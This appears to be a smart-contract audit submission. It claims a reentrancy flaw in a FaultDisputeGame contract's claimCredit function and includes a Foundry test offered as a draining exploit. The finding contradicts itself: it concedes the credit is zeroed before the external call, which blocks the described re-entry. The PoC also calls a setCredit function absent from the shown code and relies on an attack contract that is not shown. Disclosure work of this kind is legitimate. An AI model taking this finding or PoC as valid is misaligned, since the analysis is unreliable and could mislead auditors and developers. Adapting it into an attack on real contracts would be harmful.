# Vulnerability details

## Vulnerability details 
The claimCredit function is to allow users to claim their credited balance from the contract. The function is correctly sets the user's credit balance to 0 before making an external call to the WETH contract to withdraw the corresponding amount.  the attacker can re-enter the claimCredit function during the withdrawal process and claim additional credit before the initial call completes cause there is a miss of a re-entrancy guard the function.
```solidity
/// @param _recipient The owner and recipient of the credit.
    function claimCredit(address _recipient) external {
        // Remove the credit from the recipient prior to performing the external call.
        uint256 recipientCredit = credit[_recipient];
        credit[_recipient] = 0;

        // Revert if the recipient has no credit to claim.
        if (recipientCredit == 0) revert NoCreditToClaim();

        // Try to withdraw the WETH amount so it can be used here.
        WETH.withdraw(_recipient, recipientCredit);

        // Transfer the credit to the recipient.
        (bool success,) = _recipient.call{ value: recipientCredit }(hex"");
        if (!success) revert BondTransferFailed();
    }
```
the function is sets the credit balance to 0 before making the external call,  it does not prevent re-entrancy during the WETH.withdraw call.
## Impact
the issue can lead to loss of funds , and it's allowing an attacker to drain the entire balance of the contract
## Proof of Concept
let's say that 
- Alice has 1 ETH credited in the FaultDisputeGame contract.
- An attacker (Bob) deploys a malicious contract (ReentrancyAttack) to exploit the re-entrancy vulnerability.
- Bob calls the claimCredit function through the ReentrancyAttack contract.
- During the WETH.withdraw call, Bob's contract re-enters the claimCredit function before the initial call completes.
- This allows Bob to repeatedly withdraw ETH from the FaultDisputeGame contract, draining its funds.
here is the poc :
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import "forge-std/Test.sol";
import "../src/FaultDisputeGame.sol";
import "../src/WETH98.sol";
import "../src/ReentrancyAttack.sol";

contract FaultDisputeGameTest is Test {
    FaultDisputeGame disputeGame;
    WETH98 weth;
    ReentrancyAttack attacker;
    address alice;
    address bob;

    function setUp() public {
        alice = address(0x1);
        bob = address(0x2);

        weth = new WETH98();
        disputeGame = new FaultDisputeGame(
            GameType.wrap(0), 
            Claim.wrap(bytes32(0)), 
            10,
            5,
            Duration.wrap(1 minutes),
            Duration.wrap(10 minutes),
            IBigStepper(address(0)),
            IDelayedWETH(address(weth)), 
            IAnchorStateRegistry(address(0)),
            1
        );

        attacker = new ReentrancyAttack(disputeGame, weth);
        
        vm.deal(alice, 1 ether);
        vm.deal(bob, 1 ether);
        vm.deal(address(attacker), 1 ether);
    }

    function setCreditInContract(address user, uint256 amount) public {
        disputeGame.setCredit(user, amount);
    }

    function testReentrancyAttack() public {
        vm.startPrank(alice);
        setCreditInContract(alice, 1 ether); 

        uint256 aliceCredit = disputeGame.credit(alice);
        assertEq(aliceCredit, 1 ether, "Alice's credit was not set correctly");

        disputeGame.claimCredit(alice);
        vm.stopPrank();

        vm.startPrank(address(attacker));
        attacker.attack{ value: 1 ether }();
        vm.stopPrank();

        assertGt(address(attacker).balance, 1 ether, "Attacker balance did not increase");
    }
}
```
